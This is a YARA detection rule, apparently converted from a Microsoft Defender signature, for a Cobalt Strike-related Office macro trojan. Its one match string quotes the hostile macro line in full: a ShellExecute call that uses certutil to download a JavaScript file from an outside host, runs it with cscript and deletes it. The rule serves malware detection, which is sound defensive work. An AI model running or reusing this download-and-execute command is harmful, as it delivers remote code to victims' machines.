rule Trojan_O97M_CobaltStrike_RC_2147776605_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/CobaltStrike.RC!MTB"
        threat_id = "2147776605"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "CobaltStrike"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Application.ShellExecute \"cmd.exe\", \"/c certutil -urlcache -split -f https://docs.healthmade.org//tc.js \"\"%USERPROFILE%\\\\Documents\\\\tc.js\"\" && cscript \"\"%USERPROFILE%\\\\Documents\\\\tc.js\"\" && del \"\"%USERPROFILE%\\\\Documents\\\\tc.js\"\" \", \"C:\\Windows\\System32\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

